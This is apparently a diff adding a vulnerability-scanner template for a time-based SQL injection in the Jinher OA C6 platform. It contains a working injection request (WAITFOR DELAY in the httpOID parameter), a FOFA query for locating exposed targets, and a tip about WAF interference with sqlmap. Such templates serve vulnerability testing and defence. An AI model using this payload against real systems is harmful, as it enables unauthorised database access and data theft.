@@ -1,0 +1,31 @@
+id: jinher-oa-c6-IncentivePlanFulfillAppprove-sqli
+info:
+  name: 金和 OA c6 IncentivePlanFulfillAppprove.aspx - sqli
+  author: leadlife
+  severity: high
+  description: 金和oa协同管理平台（又称金和C6协调管理平台），共有20多个应用模块，160多个应用子模块，涉及的企业管理业务包括协同办公管理、人力资源管理、项目管理、客户关系管理、企业目标管理、费用管理等多个业务范围。该系统存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3IncentivePlanFulfillAppprove.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="金和网络-金和OA"
+    tips: sqlmap 跑不出来一半是存在 waf
+  tags: 2025,jinher,oa,time,sqli
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
